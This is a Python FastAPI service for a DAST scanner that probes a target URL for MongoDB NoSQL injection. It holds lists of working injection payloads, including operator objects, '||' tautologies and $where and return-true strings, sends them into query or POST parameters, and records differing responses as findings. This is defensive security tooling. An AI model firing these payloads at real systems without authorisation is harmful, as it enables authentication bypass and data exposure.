"""
NoSQLMap DAST service — NoSQL injection scanner.

The upstream NoSQLMap project is Python 2-only and unmaintained. This wrapper
drives common MongoDB NoSQL injection payloads over HTTP using requests, which
is the same technique NoSQLMap applies internally but works on Python 3.

Config options:
  - target (required): URL with an injectable parameter
  - param: Query/body parameter name to inject into (default: auto-detect from URL)
  - method: HTTP method (default: GET)
  - data: POST body for POST-based injection
"""

import json
import logging
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import requests as http_requests
from common.models import HealthResponse, ScanRequest, VersionResponse
from fastapi import FastAPI, HTTPException

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOOL_NAME = "nosqlmap"
TOOL_CATEGORY = "dast"
NOSQLMAP_VERSION = "1.0.0-py3"

NOSQL_PAYLOADS = [
    {"$gt": ""},
    {"$ne": ""},
    {"$regex": ".*"},
    {"$exists": True},
    {"$gt": 0},
]

STRING_PAYLOADS = [
    "' || '1'=='1",
    "admin'||'1'=='1",
    '{"$gt": ""}',
    '{"$ne": ""}',
    "true, $where: '1 == 1'",
    "';return true;var a='",
]

app = FastAPI(title="NoSQLMap Service", version="1.0.0")


@app.get("/health", response_model=HealthResponse)
def health():
    return {"status": "healthy", "service": TOOL_NAME}


@app.get("/version", response_model=VersionResponse)
def version():
    return {"version": NOSQLMAP_VERSION, "status": "success"}


def _resolve_report_dir(workspace_path: str, report_base: Optional[str] = None) -> Path:
    if report_base:
        return Path(report_base) / "reports" / TOOL_CATEGORY / TOOL_NAME
    parts = Path(workspace_path).parts
    if "workspaces" in parts:
        idx = parts.index("workspaces")
        if idx + 1 < len(parts):
            return Path(*parts[: idx + 2]) / "reports" / TOOL_CATEGORY / TOOL_NAME
    return Path(workspace_path).parent / "reports" / TOOL_CATEGORY / TOOL_NAME


def _get_baseline(
    url: str, method: str, data: Optional[str], timeout: int
) -> Optional[http_requests.Response]:
    try:
        if method.upper() == "POST":
            return http_requests.request(method, url, data=data, timeout=timeout, allow_redirects=False)
        return http_requests.get(url, timeout=timeout, allow_redirects=False)
    except Exception:
        return None


def _test_injection(
    url: str,
    param: str,
    method: str,
    data: Optional[str],
    baseline_len: int,
    baseline_status: int,
    timeout: int,
) -> List[Dict[str, Any]]:
    findings: List[Dict[str, Any]] = []
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    for payload in STRING_PAYLOADS:
        try:
            if method.upper() == "GET" and param in qs:
                modified_qs = dict(qs)
                modified_qs[param] = [payload]
                test_url = urlunparse(parsed._replace(query=urlencode(modified_qs, doseq=True)))
                resp = http_requests.get(test_url, timeout=timeout, allow_redirects=False)
            elif method.upper() == "POST" and data:
                modified_data = re.sub(rf"({re.escape(param)}=)[^&]*", rf"\g<1>{payload}", data)
                resp = http_requests.post(
                    url, data=modified_data, timeout=timeout, allow_redirects=False
                )
            else:
                continue

            if (
                resp.status_code != baseline_status
                or abs(len(resp.text) - baseline_len) > baseline_len * 0.3
            ):
                findings.append(
                    {
                        "tool": TOOL_NAME,
                        "title": "NoSQL injection indicator",
                        "severity": "high",
                        "target": url,
                        "detail": f"Parameter '{param}' responded differently to payload: {payload}",
                        "evidence": (
                            f"baseline={baseline_status}/{baseline_len}B, "
                            f"test={resp.status_code}/{len(resp.text)}B"
                        ),
                    }
                )
        except Exception as exc:
            logger.debug("Payload test failed: %s", exc)

    return findings


@app.post("/scan")
def scan(request: ScanRequest):
    full_scan_path = Path(request.workspace_path) / request.scan_path
    if not full_scan_path.exists():
        raise HTTPException(status_code=404, detail=f"Scan path does not exist: {full_scan_path}")

    config = request.config or {}
    target = str(config.get("target", "")).strip()
    if not target:
        raise HTTPException(status_code=400, detail="target is required")

    method = str(config.get("method", "GET")).strip().upper()
    data = config.get("data")
    param = config.get("param", "").strip()
    timeout = int(config.get("timeout_seconds", 600))
    req_timeout = min(timeout, 30)

    parsed = urlparse(target)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    params_to_test = [param] if param else list(qs.keys())

    if not params_to_test:
        raise HTTPException(
            status_code=400,
            detail=(
                "No injectable parameter found in target URL. "
                "Provide config.param or add query parameters."
            ),
        )

    baseline = _get_baseline(target, method, data, req_timeout)
    if not baseline:
        raise HTTPException(status_code=502, detail=f"Cannot reach target: {target}")

    all_findings: List[Dict[str, Any]] = []
    for p in params_to_test:
        all_findings.extend(
            _test_injection(
                target, p, method, data, len(baseline.text), baseline.status_code, req_timeout
            )
        )

    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H-%M-%S-%f")[:-3] + "Z"
    output_dir = _resolve_report_dir(request.workspace_path, request.report_base)
    output_dir.mkdir(parents=True, exist_ok=True)
    output_path = output_dir / f"{timestamp}.json"
    with open(output_path, "w", encoding="utf-8") as handle:
        json.dump(all_findings, handle, indent=2)

    return {
        "status": "success",
        "finding_count": len(all_findings),
        "report_path": str(output_path),
        "timestamp": timestamp,
    }


@app.get("/reports")
def list_reports(workspace_path: str, report_base: Optional[str] = None):
    report_dir = _resolve_report_dir(workspace_path, report_base)
    if not report_dir.exists():
        return {"status": "success", "reports": []}
    reports = sorted([p.stem for p in report_dir.iterdir() if p.is_file()], reverse=True)
    return {"status": "success", "reports": reports}


@app.get("/report/{timestamp}")
def get_report(timestamp: str, workspace_path: str, report_base: Optional[str] = None):
    report_dir = _resolve_report_dir(workspace_path, report_base)
    candidate = report_dir / f"{timestamp}.json"
    if not candidate.exists():
        raise HTTPException(status_code=404, detail=f"No report found for timestamp '{timestamp}'")
    with open(candidate, encoding="utf-8") as handle:
        data = json.load(handle)
    return {"status": "success", "report": data, "report_path": str(candidate)}
